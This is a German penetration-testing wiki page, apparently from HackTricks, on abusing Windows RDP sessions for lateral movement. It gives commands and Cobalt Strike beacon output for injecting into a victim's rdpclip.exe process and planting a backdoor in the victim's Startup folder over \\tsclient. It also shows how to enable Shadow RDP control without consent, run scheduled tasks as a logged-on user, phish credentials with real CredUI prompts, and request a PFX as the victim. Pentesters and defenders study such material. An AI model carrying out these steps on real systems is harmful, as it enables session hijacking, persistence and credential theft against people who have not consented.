# Missbrauch von RDP-Sitzungen

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Wenn die **externe Gruppe** **RDP-Zugriff** auf einen **Computer** in der aktuellen Domäne hat, kann ein Angreifer, der diesen Computer kompromittiert, warten, bis sich ein Mitglied der Gruppe verbindet.

Sobald sich der Benutzer über RDP verbindet, kann der **Angreifer in die Sitzung des Benutzers wechseln** und dessen Berechtigungen in der externen Domäne missbrauchen.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Sieh dir **andere Möglichkeiten an, Sessions mit anderen Tools zu stehlen** [**auf dieser Seite.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Cross-Session Authentication Relay

Eine **aktive Konsolen- oder RDP-Session**, die einem anderen Domänenbenutzer gehört, ist ebenfalls ein möglicher Ansatzpunkt, wenn du auf demselben Host eine Shell mit geringeren Berechtigungen hast. Eine sitzungsübergreifende DCOM-Aktivierung kann dazu führen, dass sich ein geeigneter COM-Server in dieser interaktiven Session authentifiziert. Tools wie RemotePotato0 oder KrbRelay können diese Authentifizierung abfangen oder weiterleiten. Der angemeldete Benutzer muss kein Domänenadministrator sein: Ein eng begrenztes Verzeichnisrecht, etwa die Berechtigung, ein von gMSA verwaltetes Passwort auszulesen, kann für einen weiteren Pivot ausreichen.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Ermittle zunächst die Session-ID und Identität mit `query user`, `qwinsta` oder der vorhandenen winPEAS-Sitzungsübersicht. Betrachte sie als **mögliche Ansatzpunkte**, nicht als Beweis für einen möglichen Relay-Pfad. Die COM-Klasse, ihre Impersonation- und Authentifizierungsebenen, die Zugänglichkeit der Session, das Firewall-/OXID-Routing, der Schutz des Zielprotokolls und die effektiven Rechte des angemeldeten Principals spielen alle eine Rolle. KrbRelay dokumentiert sitzungsübergreifende Beispiele für LDAP, HTTP, SMB und NTLM, doch diese Pfade hängen von Version und Konfiguration ab. LDAP channel binding ist ein weiteres Relay-Hindernis auf der Zielseite. Das Projekt RemotePotato0 weist insbesondere darauf hin, dass sein ursprüngliches RPC-zu-LDAP-Exploit-Szenario 2022 behoben wurde. Schließe also nicht allein aus einer sichtbaren Session auf einen erfolgreichen LDAP-Relay.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Wenn sich ein Benutzer **per RDP mit einem Rechner verbindet**, auf dem ein **Angreifer** auf ihn **wartet**, kann der Angreifer **einen Beacon in die RDP-Session des Benutzers injizieren**. Wenn das **Opfer beim Zugriff per RDP sein Laufwerk eingebunden hat**, könnte der **Angreifer darauf zugreifen**.

In diesem Fall könntest du einfach den **ursprünglichen Rechner des Opfers kompromittieren**, indem du eine **Backdoor** in den **Autostartordner** schreibst.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Wenn du auf einem Host, auf dem das Opfer bereits eine **aktive RDP-Sitzung** hat, **local admin** bist, kannst du möglicherweise **diesen Desktop anzeigen/steuern, ohne das Passwort zu stehlen oder LSASS zu dumpen**.<sup>[[1]](#references)</sup>

Dies hängt von der **Remote Desktop Services shadowing**-Richtlinie ab, die hier gespeichert ist:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Interessante Werte:

- `0`: Deaktiviert
- `1`: `EnableInputNotify` (Steuerung, Zustimmung des Benutzers erforderlich)
- `2`: `EnableInputNoNotify` (Steuerung, **keine Zustimmung des Benutzers**)
- `3`: `EnableNoInputNotify` (nur Ansicht, Zustimmung des Benutzers erforderlich)
- `4`: `EnableNoInputNoNotify` (nur Ansicht, **keine Zustimmung des Benutzers**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Dies ist besonders nützlich, wenn ein privilegierter Benutzer, der über RDP verbunden war, einen entsperrten Desktop, eine KeePass-Sitzung, eine MMC-Konsole, eine Browsersitzung oder eine Admin-Shell geöffnet gelassen hat.

## Scheduled Tasks As Logged-On User

Wenn du **local admin** bist und der Zielbenutzer **aktuell angemeldet** ist, kann der Task Scheduler Code **als dieser Benutzer ohne dessen Passwort starten**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Dadurch wird die bestehende Anmeldesitzung des Opfers zu einer Ausführungsprimitive:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Hinweise:

- Wenn der Benutzer **nicht angemeldet ist**, benötigt Windows normalerweise das Passwort, um eine Aufgabe zu erstellen, die als dieser Benutzer ausgeführt wird.
- Wenn der Benutzer **angemeldet ist**, kann die Aufgabe den bestehenden Anmeldekontext wiederverwenden.
- So lassen sich GUI-Aktionen ausführen oder Binärdateien innerhalb der Sitzung des Opfers starten, ohne LSASS anzufassen.

## Missbrauch von CredUI-Eingabeaufforderungen in der Sitzung des Opfers

Sobald du **innerhalb des interaktiven Desktops des Opfers** Befehle ausführen kannst (zum Beispiel über **Shadow RDP** oder **eine als dieser Benutzer ausgeführte geplante Aufgabe**), kannst du mithilfe der CredUI-APIs eine **echte Windows-Anmeldeaufforderung** anzeigen und die vom Opfer eingegebenen Zugangsdaten abfangen.<sup>[[1]](#references)</sup>

Relevante APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typischer Ablauf:

1. Eine Binärdatei in der Sitzung des Opfers starten.
2. Eine Domänenauthentifizierungsaufforderung anzeigen, die dem aktuellen Domänenbranding entspricht.
3. Den zurückgegebenen Authentifizierungspuffer entpacken.
4. Die angegebenen Zugangsdaten überprüfen und optional so lange erneut nachfragen, bis gültige Zugangsdaten eingegeben werden.

Das ist für **On-Host-Phishing** nützlich, da die Eingabeaufforderung von standardmäßigen Windows-APIs und nicht von einem gefälschten HTML-Formular dargestellt wird.

## Anfordern eines PFX im Kontext des Opfers

Mit demselben **scheduled-task-as-user**-Primitive kann ein **Zertifikat/PFX als der angemeldete Benutzer** angefordert werden. Dieses Zertifikat kann später für die **AD-Authentifizierung** als dieser Benutzer verwendet werden, sodass kein Passwort gestohlen werden muss.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Grob umrissener Ablauf:

1. **Lokale Administratorrechte** auf einem Host erlangen, an dem das Opfer angemeldet ist.
2. Die Registrierungs-/Exportlogik mithilfe einer **geplanten Aufgabe** als Opfer ausführen.
3. Das resultierende **PFX** exportieren.
4. Das PFX für die PKINIT-/zertifikatbasierte AD-Authentifizierung verwenden.

Weitere Informationen zu nachfolgenden Angriffsmöglichkeiten findest du auf den AD CS-Seiten:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Von flachen Netzwerken zu gesperrten Domänen mit Tiering-Modellen](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – `mstsc`-Optionen für Shadow-Sitzungen](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - Pull Request #465 zum Shadow-RDP-Plugin](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as-Modul](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Pull Request #908 zum Anfordern eines PFX über eine geplante Aufgabe](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - sitzungsübergreifende DCOM-Aktivierung und aktuelle Einschränkungen](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - Beispiele für sitzungsübergreifendes Relay und CLSID-Anforderungen](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - Befehl „query session“](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - Attribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP Channel Binding und Relay-Schutz](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
